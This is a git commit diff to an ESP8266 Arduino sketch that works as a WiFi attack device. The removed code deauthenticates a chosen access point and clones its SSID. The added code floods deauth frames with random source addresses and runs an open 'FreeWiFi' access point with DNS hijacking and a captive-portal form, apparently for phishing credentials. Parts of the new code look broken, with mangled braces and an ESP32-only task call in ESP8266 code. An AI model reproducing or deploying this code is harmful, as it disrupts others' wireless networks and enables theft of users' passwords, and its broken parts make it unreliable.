dda0d966ba359b9a83e89409306f0cf655b543cc
Ashfaque Khan <42895491+ashfaquekhan@users.noreply.github.com>
2023-04-10 20:06:47 +0530

    test

--- hehe_exp.ino
+++ hehe_exp.ino
@@ -5,17 +5,20 @@
 #include <Wire.h>
 #include "SSD1306.h"
 #include <ezButton.h>
+
 #ifdef ESP8266
 extern "C" {
 #include "user_interface.h"
 }
 #endif
+
 //_________________________________________________________________
 SSD1306 display(0x3c, 4, 5); 
 bool deAuth = false;
 const int SHORT_PRESS_TIME = 500; 
 const int LONG_PRESS_TIME  = 2000;
 char ssid[20];
+
 //----------------------------------------------------------------
 // Captive Portal Prerequisites : -
 //----------------------------------------------------------------
@@ -72,34 +75,6 @@ uint8_t packet[26] = {
     0x01, 0x00
 };
 
-uint8_t packet2[26] = {
-    /*  0 - 1  */ 0xC0,
-    0x00, // type, subtype c0: deauth (a0: disassociate)
-    /*  2 - 3  */ 0x00,
-    0x00, // duration (SDK takes care of that)
-    /*  4 - 9  */ 0xFF,
-    0xFF,
-    0xFF,
-    0xFF,
-    0xFF,
-    0xFF, // reciever (target)
-    /* 10 - 15 */ 0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC, // source (ap)
-    /* 16 - 21 */ 0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC, // BSSID (ap)
-    /* 22 - 23 */ 0x00,
-    0x00, // fragment & squence number
-    /* 24 - 25 */ 0x01,
-    0x00 // reason code (1 = unspecified reason)
-};
 enum SendPacketStatus {
     SEND_PACKET_SUCCESS,
     SEND_PACKET_WIFI_ERROR,
@@ -119,154 +94,98 @@ SendPacketStatus sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_c
         } else if (ret == -2) {
             // Failed to send packet
             continue;
-        } else if (ret == -3) {
-            // Packet transmission timed out
-            return SEND_PACKET_TIMEOUT_ERROR;
-        }
-    }
-    // All tries failed
-    return SEND_PACKET_SEND_ERROR;
+            } else if (ret == -3) {
+// Packet transmission timeout
+return SEND_PACKET_TIMEOUT_ERROR;
+} else {
+// Unknown error
+return SEND_PACKET_SEND_ERROR;
+}
+}
+return SEND_PACKET_TIMEOUT_ERROR;
 }
 
-bool deauthDevice(uint8_t* mac, uint8_t wifi_channel, uint8_t packet_type = 0xc0) {
-    const uint8_t packet_size = sizeof(packet2);
-    bool success = false;
-    uint8_t* packet = new uint8_t[packet_size];
-
-    // copy the template packet to a new buffer
-    memcpy(packet, packet2, packet_size);
-
-    // update the packet type
-    packet[0] = packet_type;
-
-    // update the MAC addresses
-    memcpy(&packet[10], mac, 6);
-    memcpy(&packet[16], mac, 6);
-
-    // send the packet
-    if (sendPacket(packet, packet_size, wifi_channel, 2)) {
-        success = true;
-    }
-
-    // cleanup
-    delete[] packet;
-
-    return success;
+void sendDeauthPackets() {
+uint16_t channel = random(1, 14);
+int numPackets = random(1, 6);
+for (int i = 0; i < numPackets; i++) {
+packet[10] = random(0x00, 0xFF);
+packet[11] = random(0x00, 0xFF);
+packet[12] = random(0x00, 0xFF);
+packet[13] = random(0x00, 0xFF);
+packet[14] = random(0x00, 0xFF);
+packet[15] = random(0x00, 0xFF);
+sendPacket(packet, sizeof(packet), channel, 10);
 }
-//_____________________________________________________________________
+}
 
-ezButton button(2);  
+void deauthThread() {
+while (1) {
+if (deAuth) {
+sendDeauthPackets();
+}
+delay(random(10, 200));
+}
+}
 
-unsigned long pressedTime  = 0;
-unsigned long releasedTime = 0;
-boolean bt = false;
-boolean caPtl = true;
-#define flipDisplay true
+ezButton button(D1);
 
-int n,i=0;
+void shortPress() {
+deAuth = true;
+}
+
+void longPress() {
+WiFi.mode(WIFI_OFF);
+ESP.restart();
+}
+
 void setup() {
-  display.init();
-  if(flipDisplay) display.flipScreenVertically();
-  //_____________________________________________
-  display.clear();
-  display.setFont(ArialMT_Plain_16);
-  display.drawString(0, 0, "WiFi");
-  display.drawString(0, 16, "Pishing");
-  display.setFont(ArialMT_Plain_10);
-  display.drawString(0, 50, "AshfaqueKhan");
-  display.display();
-  //_____________________________________________
-  Serial.begin(115200);
-  Serial.println("");
-  //_____________________________________________
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect(); 
-  delay(100);
-  n = WiFi.scanNetworks();
-  //_____________________________________________
-  button.setDebounceTime(50);
-  //_____________________________________________
-  delay(2500);
+Serial.begin(9600);
+display.init();
+display.flipScreenVertically();
+display.setTextAlignment(TEXT_ALIGN_LEFT);
+display.setFont(ArialMT_Plain_10);
+display.drawString(0, 0, "Press Button:");
+display.drawString(0, 20, "Short:Start Deauth");
+display.drawString(0, 30, "Long:Restart");
+display.display();
+delay(2000);
+WiFi.mode(WIFI_AP);
+snprintf(ssid, 20, "FreeWiFi_%02X:%02X:%02X", ESP.getChipId() >> 16 & 0xFF, ESP.getChipId() >> 8 & 0xFF, ESP.getChipId() & 0xFF);
+WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+WiFi.softAP(ssid, "");
+dnsServer.start(DNS_PORT, "*", apIP);
+server.on("/", handleRoot);
+server.on("/update", HTTP_GET, handleForm);
+server.begin();
+
+button.setDebounceTime(50);
+button.setShortPressTime(SHORT_PRESS_TIME);
+button.setLongPressTime(LONG_PRESS_TIME);
+button.begin();
+
+xTaskCreatePinnedToCore(
+    deauthThread,    /* Function to implement the task */
+    "Deauth Task",   /* Name of the task */
+    10000,           /* Stack size in words */
+    NULL,            /* Task input parameter */
+    0,               /* Priority of the task */
+    NULL,            /* Task handle. */
+    0                /* Core where the task should run */
+);
 }
 
-void disp()
-{
-  button.loop(); 
-  if(button.isPressed())
-  { 
-    bt=true;
-    pressedTime = millis();
-  }
-  if(button.isReleased()) {
-    releasedTime = millis();
-    bt=false;
-    long pressDuration = releasedTime - pressedTime;
-
-    if( pressDuration < SHORT_PRESS_TIME )
-      Serial.println("A short press is detected");
-      i++;
-  }
-  long pressDuration2 = millis() - pressedTime;
-  if( pressDuration2 > LONG_PRESS_TIME && bt==true )
-  {
-    deAuth=true;
-    bt=false;
-  }
-    i=i%n;
-    display.clear();
-    display.setFont(ArialMT_Plain_16);
-    display.drawString(0, 0, WiFi.SSID(i));
-    display.drawString(0, 16, "SignaL |");
-    display.drawString(64, 16, String(WiFi.RSSI(i)));
-    display.drawString(0, 32, "Channel|");
-    display.drawString(64, 32, String(WiFi.channel(i)));
-    display.setFont(ArialMT_Plain_10);
-    display.drawString(0, 50, String(i+1));
-    display.drawString(6, 50,"  /  ");
-    display.drawString(10, 50, String(n));
-    display.display();
+void loop() {
+dnsServer.processNextRequest();
+server.handleClient();
+button.loop();
+if (deAuth) {
+display.clear();
+display.drawString(0, 0, "Deauthenticating");
+display.display();
+}
 }
 
-void deauthLoop()
-{
-    WiFi.SSID(i).toCharArray(ssid,20);
-    deauthDevice(WiFi.BSSID(i), WiFi.channel(i));
-    display.clear();
-    display.setFont(ArialMT_Plain_16);
-    display.drawString(0, 0, WiFi.SSID(i));
-    display.drawString(0, 16, "SignaL |");
-    display.drawString(64, 16, String(WiFi.RSSI(i)));
-    display.drawString(0, 32, "Channel|");
-    display.drawString(64, 32, String(WiFi.channel(i)));
-    display.setFont(ArialMT_Plain_10);
-    display.drawString(0, 50, "Deauthenticating");
-    display.drawString(100, 50,String(deauthDevice(WiFi.BSSID(i), WiFi.channel(i))));
-    display.display();
-    if(caPtl)
-    {
-        WiFi.mode(WIFI_AP_STA);// dual mode
-        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-        WiFi.softAP(ssid);  
-        Serial.println("");
-        dnsServer.start(DNS_PORT, "*", apIP);
-        server.on("/", handleRoot);
-        server.on("/update", handleForm);
-        server.onNotFound(handleRoot);
-        server.begin(); 
-        caPtl=false;
-    }
-    delay(1000);
-}
-void loop()
-{
-  if(deAuth)
-  {
-    deauthLoop();
-    dnsServer.processNextRequest();
-    server.handleClient();  
-  }
-  else
-  {
-    disp();
-  }
-}
+
+
+
